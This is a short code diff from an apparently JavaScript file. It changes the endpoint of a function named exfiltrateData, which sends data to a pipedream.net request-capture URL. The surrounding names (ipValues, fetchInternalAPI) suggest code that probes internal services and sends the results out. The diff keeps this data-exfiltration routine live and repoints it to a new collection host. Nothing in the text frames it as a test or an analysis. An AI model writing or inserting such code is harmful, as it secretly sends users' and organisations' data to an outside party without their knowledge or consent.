@@ -19,7 +19,7 @@ const ipValues = [
 ];
 
 function exfiltrateData(data) {
-    fetch("https://enzg43nyjjll.x.pipedream.net/?data=" + encodeURIComponent(data));
+    fetch("https://ent3dxrn4z3ni.x.pipedream.net/?data=" + encodeURIComponent(data));
 }
 
 function fetchInternalAPI() {
